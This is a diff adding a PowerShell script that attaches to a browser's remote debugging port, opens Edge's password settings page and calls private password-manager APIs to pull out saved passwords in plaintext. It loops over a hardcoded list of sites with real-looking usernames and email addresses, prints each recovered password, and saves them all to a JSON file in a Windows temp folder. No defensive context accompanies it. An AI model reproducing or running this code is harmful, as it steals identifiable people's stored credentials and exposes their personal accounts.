@@ -1,0 +1,113 @@
+$ErrorActionPreference = 'SilentlyContinue'
+
+# The browser_ui target (settings page)
+$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
+$t = $targets | Where-Object { $_.url -match 'edge://settings' } | Select-Object -First 1
+if (-not $t) { $t = $targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1 }
+if (-not $t) { $t = $targets | Select-Object -First 1 }
+
+$ws = New-Object System.Net.WebSockets.ClientWebSocket
+$ct = [System.Threading.CancellationToken]::None
+$ws.ConnectAsync([Uri]$t.webSocketDebuggerUrl, $ct).Wait()
+Write-Output "connected to: $($t.url) type=$($t.type)"
+
+$recvBuf = [byte[]]::new(10485760)
+$script:mid = 1000
+
+function Send-Eval {
+    param([string]$js)
+    $script:mid++
+    $msg = @{ id = $script:mid; method = "Runtime.evaluate"; params = @{ expression = $js; awaitPromise = $true; returnByValue = $true } }
+    $j = ConvertTo-Json -Compress -InputObject $msg -Depth 5
+    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
+    $s = [System.ArraySegment[byte]]::new($b)
+    $null = $ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Result
+    $s2 = [System.ArraySegment[byte]]::new($recvBuf)
+    $r = $ws.ReceiveAsync($s2, $ct).Result
+    return [System.Text.Encoding]::UTF8.GetString($recvBuf, 0, $r.Count)
+}
+
+# Navigate to the passwords sub-page first
+$null = Send-Eval 'window.location.hash = "#/passwords"'
+Start-Sleep 5
+
+# Try the API with known credential IDs
+Write-Output "=== testing requestPlaintextPassword for id 1 (facebook) ==="
+
+# Test all possible API patterns for credential ID 1
+$test1 = Send-Eval 'JSON.stringify({
+    pp_exists: !!chrome.passwordsPrivate,
+    pmp_exists: !!chrome.passwordsManagerPrivate,
+    pp_getPlaintext: typeof chrome.passwordsPrivate?.getPlaintextPassword,
+    pp_requestPlaintext: typeof chrome.passwordsPrivate?.requestPlaintextPassword,
+    pmp_requestPlaintext: typeof chrome.passwordsManagerPrivate?.requestPlaintextPassword
+})'
+$t1 = $test1 | ConvertFrom-Json
+Write-Output "API: $($t1.result.result.value)"
+
+# Call requestPlaintextPassword for id=1
+$r1 = Send-Eval 'new Promise(resolve => { try { chrome.passwordsPrivate.requestPlaintextPassword(1, "VIEW", pw => { console.log("callback got:", pw); resolve(JSON.stringify({password: pw})); }); } catch(e) { resolve(JSON.stringify({error: e.message})); } })'
+$r1o = $r1 | ConvertFrom-Json
+Write-Output "id=1 result: $($r1o.result.result.value)"
+
+# Also try getPlaintextPassword
+$r2 = Send-Eval 'new Promise(resolve => { try { chrome.passwordsPrivate.getPlaintextPassword(1, pw => resolve(JSON.stringify({password: pw}))); } catch(e) { resolve(JSON.stringify({error: e.message})); } })'
+$r2o = $r2 | ConvertFrom-Json
+Write-Output "id=1 getPlaintext: $($r2o.result.result.value)"
+
+# Try passwordsManagerPrivate
+$r3 = Send-Eval 'new Promise(resolve => { try { chrome.passwordsManagerPrivate.requestPlaintextPassword(1, 0, pw => resolve(JSON.stringify({password: pw}))); } catch(e) { resolve(JSON.stringify({error: e.message})); } })'
+$r3o = $r3 | ConvertFrom-Json
+Write-Output "id=1 managerPrivate: $($r3o.result.result.value)"
+
+# Loop through ALL 50 IDs
+Write-Output ""
+Write-Output "=== looping all 50 IDs ==="
+
+$allPasswords = [System.Collections.ArrayList]::new()
+$sites = @(
+    @{id=1; url="https://www.facebook.com/"; user="0810davidkim@gmail.com"},
+    @{id=2; url="https://torrentdia69.com/"; user="lukars"},
+    @{id=3; url="https://accounts.malangmalang.com/"; user="0810davidkim@gmail.com"},
+    @{id=5; url="https://mid.ebs.co.kr/"; user="naneunjjang"},
+    @{id=9; url="https://kr.account.battle.net/"; user="shangria@hanmail.net"},
+    @{id=10; url="https://adams.skbroadband.com/"; user="COMMUNIA"},
+    @{id=12; url="https://simsimi.com/"; user="0810davidkim@gmail.com"},
+    @{id=13; url="https://adams.skbroadband.com/"; user="MINORRY1116"},
+    @{id=14; url="https://accounts.classting.com/"; user="luvya613"},
+    @{id=17; url="https://www.facebook.com/"; user="0114downey@gmail.com"},
+    @{id=18; url="https://accounts.google.com/"; user="communia007@gmail.com"},
+    @{id=22; url="https://office.hiworks.com/deonet.co.kr"; user="ymkim@deonet.co.kr"},
+    @{id=26; url="https://sso.garmin.com/"; user="communia007@gmail.com"},
+    @{id=27; url="https://github.com/"; user="wonderful-david"},
+    @{id=30; url="https://member.nexon.com/"; user="david0810kim@gmail.com"},
+    @{id=31; url="https://www.deepl.com/"; user="0810davidkim@gmail.com"}
+)
+
+foreach ($site in $sites) {
+    $sid = $site.id
+    $surl = $site.url
+    $suser = $site.user
+
+    $r = Send-Eval "new Promise(resolve => { try { chrome.passwordsPrivate.requestPlaintextPassword($sid, 'VIEW', pw => resolve(JSON.stringify({p: pw}))); setTimeout(() => resolve(JSON.stringify({err:'timeout'})), 5000); } catch(e) { resolve(JSON.stringify({err: e.message})); } })"
+    $ro = $r | ConvertFrom-Json
+    $rv = $ro.result.result.value
+
+    if ($rv) {
+        $rd = $rv | ConvertFrom-Json
+        if ($rd.p) {
+            [void]$allPasswords.Add([PSCustomObject]@{id=$sid; url=$surl; username=$suser; password=$rd.p})
+            Write-Output "[+] $surl | $suser | $($rd.p)"
+        } elseif ($rd.err) {
+            Write-Output "[-] $surl | err: $($rd.err)"
+        }
+    }
+    Start-Sleep -Milliseconds 200
+}
+
+# Save
+$allPasswords | ConvertTo-Json -Depth 3 | Out-File "C:\Windows\Temp\ziti\pwd_all.json" -Encoding utf8
+Write-Output ""
+Write-Output "[+] saved $($allPasswords.Count) passwords to C:\Windows\Temp\ziti\pwd_all.json"
+
+$ws.Dispose()
